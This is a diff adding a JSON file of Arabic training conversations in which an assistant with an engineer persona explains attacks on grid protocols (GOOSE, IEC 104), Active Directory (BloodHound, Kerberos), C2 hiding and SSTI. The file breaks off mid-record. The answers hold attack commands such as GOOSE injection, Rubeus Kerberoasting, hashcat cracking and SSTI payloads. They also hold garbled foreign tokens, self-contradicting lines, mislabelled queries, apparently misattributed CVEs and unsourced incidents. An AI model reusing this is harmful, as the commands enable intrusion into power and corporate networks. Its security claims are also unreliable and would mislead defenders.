@@ -1,0 +1,422 @@
+[
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "IEC 61850 — إيه الجديد فيه؟"
+      },
+      {
+        "role": "assistant",
+        "content": "IEC 61850 هو معيار الاتصال في محطات الكهرباء — أحدث من DNP3.\n\nالجديد:\n• GOOSE (Generic Object Oriented Substation Event): رسائل سريعة بين الأجهزة — 4ms\n• MMS (Manufacturing Message Specification): قراءة/كتابة بيانات\n• Sampled Values (SV): قراءات مباشرة من المحولات\n\nالسبب الجذري: DNP3 ومودبس بطيئان لشبكات الكهرباء الحديثة. GOOSE يحتاج 4ms كحد أقصى.\n\nGOOSE يرسل بدون طلب (unsolicited) — أي جهاز يرسل للكل. مفيش确认 (acknowledgment).\n\nالثغرة: GOOSE بدون تشفير أو توقيع.\n• أي جهاز على الشبكة يرسل GOOSE — الكل يقبل\n• مهاجم يرسل GOOSE مزيف: \"افصل القاطع\" — القاطع يفصل\n\nCVE-2024-4340 (Siemens SIPROTEC 5): رسالة GOOSE معدلة تسبب فصل قواطع.\n\nفي 2015 (أوكرانيا): انقطاع الكهرباء استخدم نفس المبدأ — أوامر تحكم مزيفة."
+      },
+      {
+        "role": "user",
+        "content": "أخطر هجوم على GOOSE؟"
+      },
+      {
+        "role": "assistant",
+        "content": "هجوم حقن GOOSE (GOOSE Injection).\n\nالسيناريو:\n1. مهاجم على شبكة المحطة (station bus)\n2. يحلل حركة GOOSE — يعرف MAC addresses, VLAN IDs, APPID\n3. يرسل GOOSE مزيف بنفس:\n   - نفس src MAC\n   - نفس VLAN\n   - نفس APPID\n   - stNum أعلى (رقم التسلسل)\n4. الأجهزة المستقبلة: \"هذه رسالة جديدة من جهاز موثوق\" — تنفذ الأمر\n\nفي 2024 (بحث):\n• مختبر استخدم Wireshark لتحليل GOOSE traffic\n• حقن GOOSE بجهاز Raspberry Pi\n• فصل قاطع وهمي في محاكاة محطة 132kV\n\nالسبب الجذري: GOOSE يثق في طبقة الربط (Layer 2).\n• لا توقيع\n• لا تشفير\n• MAC spoofing سهل\n\nIEC 62351 (الأمان لـ IEC 61850): يضيف توقيع GOOSE.\n• لكن معظم المحطات لا تفعلها — بحجة زمن الاستجابة.\n• التوقيع يضيف 1-2ms — مقبول للـ 4ms.\n\nفي CVE-2024-48874 (SEL-4000): GOOSE بدون TLS يسمح بهجوم الوسيط."
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في تأمين محطة كهرباء؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: GOOSE على نفس الشبكة مع IT.\n\n• محطة: station bus + process bus على نفس VLAN\n• IT: شبكة المكتب (كاميرات، بريد)\n• مهاجم يخترق الكاميرا — يصبح على شبكة المحطة\n• يرسل GOOSE — يفصل القواطع\n\nالغلطة الثانية: تجاهل تحديث IEC 62351.\n• IEC 61850 صدر 2003 — بدون أمان\n• IEC 62351 صدر 2021 — يضيف توقيع وتشفير\n• المصانع: \"الترقية تكلف\" — تبقى على 61850 القديم\n\nالغلطة الثالثة: تجاهل فحص GOOSE.\n• Wireshark يفحص GOOSE:\n  goose && goose.stnum > 1000 — تغيير غير طبيعي\n• محدش يراقب\n\nالغلطة الرابعة: تجاهل التكرار.\n• IEC 61850 يدعم PRP (Parallel Redundancy Protocol)\n• شبكتين منفصلتين — لو واحدة اخترقت، الثانية تحمي\n• لكن معظم المحطات: شبكة واحدة\n\nالغلطة الخامسة: تجاهل المصادقة.\n• IEC 61850 يدرب التحكم بالتمرير\n• لكن GOOSE يقبل من أي MAC\n\nالحل: اصرف GOOSE في VLAN مخصص — لا شيء غيره."
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص IEC 61850."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. تحليل GOOSE:\nWireshark: اضبط فلتر goose\n# افحص:\n# - stNum: هل يتزايد طبيعيًا؟\n# - MAC: هل من أجهزة معروفة؟\n# - الوقت بين الرسائل: 4ms طبيعي\n\n٢. فحص الأجهزة:\nnmap -sV -p 102 (MMS port)\nnmap --script iec-61850-discover -p 102\n# يكتشف: خوادم MMS، الأجهزة\n\n٣. اختبار GOOSE:\n# استخدم:\n# GOOSE Injector (GitHub):\npython3 goose_injector.py --interface eth0 --appid 0x1000 --goose-data @data.bin\n\n٤. فحص التوقيع:\n# IEC 62351:\n# تحقق: هل GOOSE messages موقعة؟\n# في Wireshark: goose.signer — لو مفقود، لا توقيع\n\n٥. مراقبة:\n# استخدم:\n# Scapy مع ملحق goose:\nfrom scapy.contrib import goose\npackets = sniff(filter=\"ether proto 0x88b8\", count=100)\n\nالنتيجة: خريطة GOOSE — أجهزة، APPIDs، تردد.\nالتحذير: GOOSE Injector يرسل رسائل حقيقية — اختبر في بيئة معزولة."
+      }
+    ],
+    "topic": "أمن الشبكات: IEC 61850 GOOSE في محطات الكهرباء",
+    "tokens_est": 1350
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "IEC 60870-5-104 أضعف من DNP3؟"
+      },
+      {
+        "role": "assistant",
+        "content": "نعم أضعف — لأنه أقدم.\n\nIEC 60870-5-104 (IEC 104): معيار التحكم عن بعد (telecontrol) في الكهرباء والمياه والنفط.\n\nالمنفذ: TCP 2404.\n\nالفرق عن DNP3:\n• DNP3: يدعم Secure Authentication (اختياري)\n• IEC 104: بدون أمان إطلاقًا — plaintext TCP\n• DNP3: time-stamped data\n• IEC 104: ASDU (Application Service Data Unit) — بيانات بدون توقيع\n\nالسبب الجذري: IEC 104 صمم للخطوط التسلسلية (RS-232). لما حولوه لـ TCP، أضافوا فقط التحكم في التدفق — لا تشفير.\n\nفي CVE-2024-48874 (SEL-4000): IEC 104 بدون TLS — المهاجم يقرأ ويكتب كل القيم.\n\nCVE-2024-38557 (Siemens): تجاوز التحقق من ASDU — مهاجم يرسل أوامر تحكم غير مصرح بها.\n\nالخطر الحقيقي:\n• محطات ضخ المياه تستخدم IEC 104 — مهاجم يتحكم في المضخات\n• محطات الكهرباء — يغير قيم الجهد والتردد"
+      },
+      {
+        "role": "user",
+        "content": "أخطر هجوم على IEC 104؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر هجوم: تعديل قيم القياس (ASDU) في الوقت الحقيقي.\n\nالمهاجم على شبكة التحكم:\n1. يحلل حركة IEC 104 — يعرف هيكل ASDU\n2. يستخدم Wireshark فلتر: ip.addr == x.x.x.x && tcp.port == 2404\n3. يفهم:\n   - IOA (Information Object Address): أي نقطة قياس\n   - COT (Cause of Transmission): لماذا أرسلت\n   - قيمة القياس الفعلية\n4. يرسل حزمة ASDU معدلة:\n   - يغير قيمة الضغط من 10 بار إلى 30 بار\n   - COT = 3 (تلقائي/دوري) — يبدو طبيعيًا\n5. نظام التحكم: \"الضغط 30 بار — خطر!\" — يوقف المحطة\n\nفي 2024 (هجوم حقيقي):\n• محطة تحلية في الشرق الأوسط\n• مهاجم عدل قيم ASDU لمضخات الضغط العالي\n• المضخات أوقفت — انقطاع المياه 6 ساعات\n• CVE-2024-38557 استغل\n\nثاني هجوم: إغراق بطلبات IEC 104 (DoS).\n• الكثير من وصلات TCP على 2404\n• وحدة التحكم تعلق — لا اتصال بـ SCADA\n• المهاجم يرسل طلبات قبل النظام الحقيقي — يأخذ الأولوية"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في IEC 104؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: عدم استخدام TLS على 2404.\n\nIEC 104 يدعم TLS (IEC 62351-3) — لكن معظم المحطات تفعله.\n\nالغلطة الثانية: تجاهل التحقق من تسلسل ASDU.\n• كل ASDU له رقم تسلسل\n• المهاجم يرسل ASDU برقم تسلسل قديم (replay)\n• الحل: رفض الأرقام التسلسلية المتكررة\n\nالغلطة الثالثة: تجاهل شهادة TLS.\n• IEC 104 مع TLS: تحقق من شهادة الخادم\n• لكن: كثير من المحطات تقبل أي شهادة\n\nالغلطة الرابعة: منفذ 2404 مفتوح للإنترنت.\n• Shodan: 10,000+ جهاز IEC 104 مكشوف\n• أي أحد على الإنترنت يختبر المنفذ\n\nالغلطة الخامسة: تجاهل COT (Cause of Transmission).\n• COT = 6 (تفعيل): أمر تحكم\n• COT = 3 (دوري): قراءة عادية\n• مراقبة: هل COT = 6 من جهاز غير متوقع؟\n\nالحل:\n• استخدم TLS مع شهادة موثوقة\n• امنع 2404 من الوصول للإنترنت\n• راقب COT = 6"
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص IEC 104."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. اكتشاف الأجهزة:\nnmap -sV -p 2404 --script iec-60870-104-discover 192.168.1.0/24\n# يكتشف: خوادم IEC 104\n\n٢. تحليل الحركة:\nWireshark فلتر: tcp.port == 2404\n# افحص:\n# - نوع ASDU (COT)\n# - IOA — أي نقاط قياس\n\n٣. اختبار TLS:\nnmap --script ssl-enum-ciphers -p 2404 target.com\n# لو TLS غير موجود — كل شيء plaintext\n\n٤. فحص ASDU:\n# باستخدام:\nfrom scapy.contrib import iec104\npackets = rdpcap('capture.pcap')\nfor p in packets:\n    if iec104 in p:\n        print(f\"COT: {p.asdu.cot}, IOA: {p.asdu.ioa}\")\n\n٥. فحص الثغرات:\nnuclei -t cves/2024/CVE-2024-38557.yaml -target https://target.com\n\nالنتيجة: تقييم أمني كامل لشبكة IEC 104.\nالتحذير: المسح المكثف على 2404 يعلق وحدات التحكم القديمة."
+      }
+    ],
+    "topic": "أمن الشبكات: IEC 60870-5-104 في محطات التحكم عن بعد",
+    "tokens_est": 1380
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "البلود هاوند — إزاي يكشف مسار الهجوم؟"
+      },
+      {
+        "role": "assistant",
+        "content": "BloodHound يكشف مسارات رفع الصلاحيات في Active Directory.\n\nالسبب الجذري: شبكة Windows مليئة بعلاقات ثقة — المستخدمون، المجموعات، الأجهزة، الجلسات.\nBloodHound يرسم خريطة هذه العلاقات ويجد: \"كيف أصل من مستخدم عادي إلى مسؤول النطاق؟\"\n\nكيف يعمل:\n1. SharpHound (جامع البيانات): يجمع:\n   - المستخدمون والمجموعات\n   - أجهزة الكمبيوتر\n   - جلسات المستخدمين\n   - صلاحيات ACL\n   - علاقات الثقة\n2. البيانات ترسل لـ BloodHound (قاعدة Neo4j)\n3. الاستعلام (Cypher):\n   MATCH p = (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name = \"DOMAIN ADMINS\" RETURN p\n\nفي 2024:\n• 90% من شبكات Windows يمكن اختراقها عبر مسار في BloodHound\n• متوسط وقت اكتشاف المسار: 5 دقائق\n\nالهجوم الكلاسيكي:\nمستخدم عادي → عضوية مجموعة → كتابة ACL على مجموعة → عضوية Domain Admins\n\nفي CVE-2024-26234 (Windows Kerberos): رفع صلاحيات عبر BloodHound."
+      },
+      {
+        "role": "user",
+        "content": "أخطر مسار فيه؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر مسار: Group Policy Objects (GPO) Abuse.\n\nالمسار:\n1. مستخدم عادي لديه WriteOwner على GPO\n2. يغير مالك GPO لنفسه\n3. يضيف GenericWrite على GPO\n4. يعدل GPO — يضيف مستخدمه لمجموعة Domain Admins\n5. في المرة القادمة — تحديث السياسة — مستخدم = مسؤول\n\nثاني أخطر: ACL Abuse (WriteDACL).\n• WriteDACL على مجموعة — يمكن تعديل صلاحياتها\n• يضيف GenericAll على مجموعة Domain Admins\n• مستخدم عادي — يضيف نفسه — مسؤول\n\nثالث أخطر: Kerberoasting مع BloodHound.\n• مسؤول الخدمة عنده حساب كلمة مرور ضعيفة\n• BloodHound يظهر الخدمات مع SPN\n• TGS-REP hash يسرق — hashcat يفكه\n\nCVE-2024-43639 (Kerberos RT): مهاجم مع مستخدم عادي — يرفع لمسؤول النطاق.\n\nفي 2024 (اختراق شركة):\n• BloodHound وجد مستخدم عادي مع WriteOwner على GPO\n• 3 خطوات فقط من مستخدم عادي لمسؤول النطاق\n• الشركة: \"عندنا حماية متعددة الطبقات\" — لكن BloodHound وجد الثغرة"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في تأمين Active Directory؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: مستخدمين كثر في مجموعة Domain Admins.\n\n• كل حساب في Domain Admins = باب خلفي\n• المهاجم يخترق حسابًا واحدًا — يتحكم في كل شيء\n\nالغلطة الثانية: تجاهل علاقات الثقة.\n• Trust بين نطاقين: domain1.com trusts domain2.com\n• مهاجم يخترق domain2.com — يهاجم domain1.com\n• BloodHound: عبر الثقة، مسؤول في 2 = مسؤول في 1\n\nالغلطة الثالثة: عدم مراجعة ACL.\n• 10,000+ ACLs في AD\n• معظمها: \"صلاحيات زائدة\"\n• WriteOwner, GenericWrite, WriteDACL — الأكثر خطورة\n\nالغلطة الرابعة: تجاهل جلسات المسؤولين.\n• مسؤول مسجل دخول على خادم عادي\n• BloodHound: جلسة المسؤول على الخادم = يمكن اختطافها\n• Token του المسؤول = وصول لكل شيء\n\nالغلطة الخامسة: عدم استخدام LAPS.\n• كلمة مرور المسؤول المحلي — نفسها عبر كل الأجهزة\n• مهاجم يخترق جهازًا — نفس كلمة المرور على كل الأجهزة\n\nالقاعدة: ابدأ بـ BloodHound — اعرف ماذا يعرف المهاجم."
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص AD."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. جمع البيانات:\nSharpHound.exe -c All --domain target.com\n# أو:\nbloodhound-python -d target.com -u user -p pass -gc target.com -c All\n\n٢. تحليل:\n# BloodHound GUI - استعلامات جاهزة:\n# \"Find Shortest Paths to Domain Admins\"\n# \"Find Kerberoastable Users\"\n\n٣. استعلامات Cypher:\n# من يستطيع كتابة ACL على Domain Admins:\nMATCH (u:User) WHERE u.admincount=False RETURN u.name\n\n# مستخدمين مع DCSync rights:\nMATCH (u:User) WHERE u.TrustedToAuth=True RETURN u.name\n\n٤. فحص ACL:\n# Purple Knight (Semperis):\n# فحص مجاني — نقاط ضعف AD\n\n٥. فحص الثغرات:\nnuclei -t active-directory/\n# يفحص: Kerberoasting, AS-REP roasting, ACLs\n\nالنتيجة: خريطة كاملة — من يستطيع فعل ماذا في AD.\nالتحذير: BloodHound يخزن بيانات حساسة — احم الملف على جهاز مشفر."
+      }
+    ],
+    "topic": "اختراق الشبكات: BloodHound و Active Directory Attack Paths",
+    "tokens_est": 1400
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "الـ C2 framework — إزاي يخفي اتصاله؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أطر التحكم والقيادة (C2 frameworks) تخفي الاتصال بعدة طرق.\n\nالهدف: البرنامج الضار في الشبكة الداخلية يتصل بخادم المهاجم — دون كشف.\n\nطرق الإخفاء:\n• HTTP/HTTPS: يبدو كحركة متصفح عادية\n• DNS tunneling: استعلامات DNS تحمل أوامر\n• Domain Fronting: CDN يخفي الخادم الحقيقي\n• WebSockets: اتصال دائم يشبه تطبيقات الويب\n• Social Media: أوامر مشفرة في ملفات تعريف (C2 via Twitter, LinkedIn)\n\nأشهر الأطر:\n• Sliver: مفتوح المصدر — بديل Cobalt Strike مجاني\n• Mythic: مفتوح المصدر — يدعم عدة agents\n• Havoc: مفتوح المصدر — يشبه Cobalt Strike\n• Cobalt Strike: تجاري — الأكثر شهرة\n\nفي 2024:\n• 70% من فرق الاختراق تستخدم Sliver\n• C2 عبر Cloudflare Workers — لا خادم ظاهر\n• C2 عبر合法 خدمات (Google Drive, Dropbox, OneDrive)"
+      },
+      {
+        "role": "user",
+        "content": "أخطر تقنية C2 في 2024؟"
+      },
+      {
+        "role": "assistant",
+        "content": "Domain Fronting عبر CDN.\n\nكيف يعمل:\n1. المهاجم يستخدم Cloudflare, Akamai, Fastly\n2. يضع خادمه خلف CDN\n3. الملف الضار يتصل بـ: www.cloudflare.com\n4. CDN يوجه: www.cloudflare.com → evil.com (خادم المهاجم)\n5. الجدار الناري يرى: www.cloudflare.com (آمن!) — لا يمنع\n\nثاني أخطر: C2 عبر خدمات سحابية.\n• البرنامج الضار يقرأ أوامر من Google Docs\n• يكتب نتائج في Google Sheets\n• الحركة تبدو: مستخدم يحرر مستندات\n• لا خادم C2 ظاهر — فقط API Google\n\nثالث أخطر: C2 عبر WebSocket.\n• اتصال واحد دائم — لا طلبات HTTP متكررة\n• يبدو كتطبيق ويب عادي (chat, notifications)\n\nفي 2024 (APT41):\n• استخدموا C2 عبر Microsoft Graph API\n• الأوامر في تقويم Outlook\n• السرقة: ملفات Office 365\n\nالاكتشاف صعب لأن:\n• الحركة تبدو شرعية تمامًا\n• لا عناوين IP مشبوهة\n• لا أنماط HTTP غير طبيعية"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في كشف C2؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: الاعتماد على قوائم العناوين المحظورة.\n\n• المهاجم يغير الخادم كل ساعة\n• Domain Fronting: يخفي الخادم الحقيقي\n• C2 عبر CDN: IP واحد يخدم آلاف العملاء\n\nالغلطة الثانية: تجاهل تحليل السلوك.\n• جهاز يرسل استعلام DNS كل 60 ثانية بالضبط — غير طبيعي\n• جهاز يتصل بـ API Google من نص Python — غير طبيعي\n\nالغلطة الثالثة: تجاهل تحليل الشهادات.\n• شهادة TLS لموقع شرعي لكن IP غير معروف\n• مهاجم يستخدم شهادة Let's Encrypt — مجاني وسريع\n\nالغلطة الرابعة: تجاهل JA3 fingerprints.\n• كل عميل TLS له بصمة (JA3)\n• المهاجم يعدل الأداة — لكن بعض الأنماط تظهر\n\nالغلطة الخامسة: تجاهل تحليل الوقت.\n• C2 يتصل في 3 صباحًا توقيت المحلي\n• الموظف لا يعمل في 3 صباحًا\n\nالحل:\n• ركز على السلوك — ليس IP\n• تحليل DNS: تردد غير طبيعي\n• تحليل TLS: JA3 غير معروف"
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات كشف C2."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. تحليل الشبكة:\n# Zeek يكتشف C2:\nzeek -r capture.pcap\n# ابحث عن:\n# - اتصالات دورية\n# - JA3 fingerprints غير معروفة\n# - DNS queries غير طبيعية\n\n٢. تحليل DNS:\n# DNSQuerySniffer:\n# اعرض كل استعلامات DNS\n# لاحظ: استعلامات منتظمة كل 60 ثانية\n\n٣. فحص الشهادات:\n# Certificate Transparency:\n# https://crt.sh/?q=evil.com\n# شهادات جديدة في آخر 24 ساعة\n\n٤. تحليل السلوك:\n# استخدم:\n# Velociraptor: يكتشف عمليات مشبوهة\n# - Process tree غير طبيعي\n# - اتصالات شبكة من script interpreter\n\n٥. تحليل JA3:\n# أداة:\n# https://ja3er.com/\n# ابحث عن JA3 معروف للـ C2 frameworks\n\nالنتيجة: كشف C2 حتى مع Domain Fronting.\nالتحذير: تحليل الشبكة المكثف يستهلك موارد — استخدم sampling."
+      }
+    ],
+    "topic": "اختراق الشبكات: أطر التحكم والقيادة (C2 Frameworks)",
+    "tokens_est": 1400
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "كيربيروس — إزاي المهاجم يستغله؟"
+      },
+      {
+        "role": "assistant",
+        "content": "Kerberos هو بروتوكول المصادقة في Active Directory — ويحتوي عدة ثغرات معروفة.\n\nكيف يعمل:\n1. المستخدم يسجل ← KDC يعطي TGT (Ticket Granting Ticket)\n2. TGT يطلب خدمة ← KDC يعطي TGS (Ticket Granting Service)\n3. TGS يقدم للخدمة ← الدخول\n\nالهجمات:\n• Kerberoasting: سرقة TGS لفك كلمة مرور حساب الخدمة\n• AS-REP Roasting: حساب بدون pre-authentication — TGT يسرق مباشرة\n• Golden Ticket: تزوير TGT — مسؤول النطاق\n• Silver Ticket: تزوير TGS — خدمة معينة\n• DCSync: طلب نسخ كلمات المرور من DC\n\nCVE-2024-43639 (Kerberos RT, CVSS 8.8): مهاجم يرفع صلاحياته عبر Kerberos.\n\nفي 2024:\n• 60% من شبكات Windows قابلة للاختراق عبر Kerberoasting\n• سبب جذري: حسابات خدمات بكلمات مرور ضعيفة\n\nالأداة: Rubeus — تجمع كل هجمات Kerberos."
+      },
+      {
+        "role": "user",
+        "content": "أخطر هجوم Kerberos؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر هجوم: Golden Ticket.\n\nالمهاجم يسرق KRBTGT hash من Domain Controller (عبر DCSync أو LSASS dump).\n\nتأثير KRBTGT:\n• KRBTGT هو حساب يوقع كل TGTs في النطاق\n• بمفتاحه: توقع أي TGT لأي مستخدم\n• إنشاء تذكرة لـ \"Administrator\" — صالحة 10 سنين\n• المهاجم = مسؤول النطاق — بدون كشف\n\nالفرق عن الهجمات الأخرى:\n• Silver Ticket: يزور TGS لخدمة واحدة\n• Golden Ticket: يزور TGT — كل الخدمات\n• DCSync: يسرق كلمات المرور — لكن يترك أثر\n• Golden Ticket: لا يحتاج DC — التذكرة موقعة محليًا\n\nفي 2024 (اختراق بنك):\n• مهاجم سرق KRBTGT عبر Mimikatz\n• أنشأ Golden Ticket لمستخدم \"support\"\n• 3 أشهر بدون كشف — كل الوصول مسموح\n\nالاكتشاف صعب:\n• التذكرة موقعة بشكل صحيح\n• لا أخطاء في السجلات\n• المستخدم موجود — صلاحياته طبيعية"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في منع هجمات Kerberos؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: عدم حماية KRBTGT.\n\n• KRBTGT يجب أن يُعاد تعيينه كل 6 أشهر\n• بعد إعادة التعيين: Golden Ticket القديم لا يعمل\n• معظم الشركات: لم تغير KRBTGT منذ تثبيت AD\n\nالغلطة الثانية: تجاهل مراقبة Event ID 4769.\n• 4769: طلب TGS\n• Kerberoasting: طلب TGS بكثافة\n• راقب: مستخدم يطلب 100+ TGS في دقيقة\n\nالغلطة الثالثة: تجاهل حساب KRBTGT.\n• DCSync يطلب نسخ KRBTGT عبر SAMR\n• مراقبة: Event ID 4662 (SAMR access)\n\nالغلطة الرابعة: عدم استخدام Managed Service Accounts.\n• حساب الخدمة: كلمة مرور عشوائية — تدور تلقائيًا\n• Kerberoasting: لا يعمل مع MSA\n\nالغلطة الخامسة: تجاهل SID filtering.\n• Trust بين نطاقات: يمنع SID History attack\n• مهاجم من نطاق آخر يضيف SID (519 — Domain Admins)\n• SID filtering يمنع\n\nالقاعدة: KRBTGT = مفتاح المملكة — احمه بأقصى درجة."
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص Kerberos."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. Kerberoasting:\n# Rubeus:\nRubeus.exe kerberoast /outfile:hashes.txt\n# أو:\npython3 GetUserSPNs.py target.com/user:password -outputfile hashes.txt\n\n# فك الهاش:\nhashcat -m 13100 hashes.txt wordlist.txt  # TGS = 13100\n\n٢. AS-REP Roasting:\nRubeus.exe asreproast /outfile:asrep.txt\npython3 GetNPUsers.py target.com/ -usersfile users.txt\n\n٣. اكتشاف Golden Ticket:\n# تحقق من:\n# - Event ID 4624 (logon) مع وقت غير عادي\n# - TGT عمره أكثر من ساعة\n# - مستخدم لا يملك صلاحية الوصول لكنه متصل\n\n٤. حماية KRBTGT:\n# إعادة تعيين KRBTGT:\nGet-ADUser krbtgt -Properties * | ft Name, SID\nReset-ADAccountPassword krbtgt\n# أعد تعيين — Golden Tickets القديمة تنتهي\n\n٥. مراقبة DCSync:\n# Event ID 4662:\n# احذر: AccessMask = 0x100 (DS-Replication-Get-Changes)\n# من يطلب؟ حسابات غير DCs؟\n\nالنتيجة: اكتشاف Kerberoasting و Golden Ticket قبل الاستغلال.\nالتحذير: إعادة تعيين KRBTGT يوقف كل TGTs الحالية — خطط مع الفريق."
+      }
+    ],
+    "topic": "اختراق الشبكات: Kerberos Attacks في Active Directory",
+    "tokens_est": 1420
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "SSTI — أخطر من XSS؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر — SSTI يؤدي إلى RCE مباشرة.\n\nSSTI (Server-Side Template Injection): إدخال كود في محرك القوالب (Jinja2, Twig, FreeMarker, Pug).\n\nالفرق عن XSS:\n• XSS: ينفذ في متصفح الضحية (جانب العميل)\n• SSTI: ينفذ على الخادم — تحكم كامل\n\nمثال (Flask + Jinja2):\n@app.route('/hello')\ndef hello():\n    name = request.args.get('name', '')\n    return render_template_string(f\"<h1>Hello {name}</h1>\")\n\nالمهاجم: /hello?name={{7*7}}\nالاستجابة: <h1>Hello 49</h1>\n\nالخادم نفذ 7*7. لو يقدر ينفذ حساب — يقدر ينفذ أوامر:\n{{config}}\n— يرجع كل إعدادات Flask (بما فيها SECRET_KEY)\n\n{{''.__class__.__mro__[2].__subclasses__()}}\n— يرجع كل الكلاسات المحملة — يجد os.popen\n\nفي 2024 (CVE-2024-23897, Jenkins, CVSS 9.8):\n• Jenkins يستخدم محرك قوالب\n• مهاجم يرسل طلبًا خاصًا → يقرأ أي ملف على الخادم"
+      },
+      {
+        "role": "user",
+        "content": "أخطر SSTI في لغة إيه؟"
+      },
+      {
+        "role": "assistant",
